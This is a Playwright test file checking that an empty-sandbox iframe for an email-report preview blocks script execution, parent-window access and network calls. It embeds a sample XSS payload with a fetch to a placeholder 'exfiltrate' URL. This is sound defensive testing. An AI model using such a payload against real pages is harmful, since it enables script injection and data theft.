import { test, expect } from "@playwright/test";

/**
 * Defense-in-depth check for the F9 fix (src/app/(dashboard)/email/page.tsx):
 * even in a worst case where a malicious payload somehow slipped past the
 * escaping/allowlist in email-report-template.ts, the preview `<iframe>`
 * must still be unable to run script, reach the parent window, or make a
 * network call — because it carries `sandbox=""` with neither
 * `allow-scripts` nor `allow-same-origin`. This test does not depend on the
 * app server, Firebase, or any account — it reproduces the exact iframe
 * configuration in an isolated page.
 */
test("an iframe with an empty sandbox cannot execute script, reach window.parent, or fetch", async ({ page }) => {
  await page.setContent(`
    <!doctype html>
    <html>
      <body>
        <script>window.__parentXssFired = false; window.__parentFetchSeen = false;</script>
        <iframe
          title="xss-sandbox-check"
          sandbox=""
          srcdoc="&lt;script&gt;
            window.__xssFired = true;
            try { window.parent.__parentXssFired = true; } catch (e) {}
            fetch('https://example.com/exfiltrate').catch(() =&gt; {});
          &lt;/script&gt;"
        ></iframe>
      </body>
    </html>
  `);

  const requests: string[] = [];
  page.on("request", (req) => requests.push(req.url()));

  // Give the iframe a moment to (fail to) execute.
  await page.waitForTimeout(500);

  const parentXssFired = await page.evaluate(() => (window as unknown as { __parentXssFired?: boolean }).__parentXssFired);
  expect(parentXssFired).toBe(false);
  expect(requests.some((url) => url.includes("example.com/exfiltrate"))).toBe(false);

  // A sandboxed iframe with no allow-scripts renders as an opaque origin
  // that never executes its srcdoc script — so window.__xssFired must never
  // exist even inside the frame itself, not only fail to leak to the parent.
  const frame = page.frames().find((f) => f !== page.mainFrame());
  expect(frame).toBeTruthy();
  const xssFiredInFrame = await frame!.evaluate(() => (window as unknown as { __xssFired?: boolean }).__xssFired).catch(() => undefined);
  expect(xssFiredInFrame).toBeFalsy();
});
